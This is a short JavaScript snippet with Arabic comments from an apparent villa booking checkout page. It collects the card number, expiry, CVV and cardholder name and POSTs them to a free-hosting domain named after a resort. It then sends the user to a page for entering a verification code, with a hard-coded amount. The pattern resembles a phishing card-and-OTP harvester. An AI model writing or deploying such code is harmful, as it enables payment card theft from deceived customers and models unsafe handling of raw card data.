 <script>
const finalPrice = localStorage.getItem('finalPrice') || localStorage.getItem('villaPrice') || 0;
document.getElementById('finalPrice').textContent = parseFloat(finalPrice).toFixed(2);

async function submitBooking() {
  const bookingData = {
  cardNumber: document.getElementById('creditCardNumber').value,
  cardExpiry: document.getElementById('expiryDate').value,
  cardBrand: 'Visa', // أو اجعل المستخدم يحدد نوع البطاقة
  cvv: document.getElementById('cvv').value,
  nameOnCard: document.getElementById('nameOnCard').value,
  amount: 18837 // أو اجلبه من الحجز
  };

  const res = await fetch('https://shebara.onrender.com/api/book', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(bookingData)
  });

  const data = await res.json();
  if(data.success){
    localStorage.setItem('bookingId', data.bookingId); // حفظ ID للحجز
    alert('تم بنجاح');
    window.location.href = 'verify.html'; // تحويل المستخدم لصفحة إدخال الكود
  } else {
    alert('حدث خطأ، حاول مرة أخرى');
  }
}

document.getElementById('confirmBooking').addEventListener('click', submitBooking);
</script>
